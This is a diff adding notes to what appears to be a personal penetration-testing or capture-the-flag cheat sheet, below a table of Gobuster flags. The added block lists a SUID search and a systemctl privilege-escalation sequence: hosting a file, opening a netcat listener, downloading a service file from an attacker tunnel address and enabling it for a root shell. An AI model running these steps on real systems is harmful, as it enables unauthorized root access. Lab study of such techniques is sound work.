@@ -24,3 +24,18 @@ Gobuster flag	Description
 -U and -P	Username and Password for Basic Auth
 -p <x>	Proxy to use for requests
 -c <http cookies>	Specify a cookie for simulating your auth
+
+
+
+
+```
+Use the command: find / -user root -perm -4000 -exec ls -ldb {} \;
+/bin/systemctl
+
+python3 -m http.server 80 #host
+nc -lvnp 9002 # host
+
+wget http://ip_tun_kita/root.service
+systemctl enable /tmp/root.service
+systemctl start root
+```
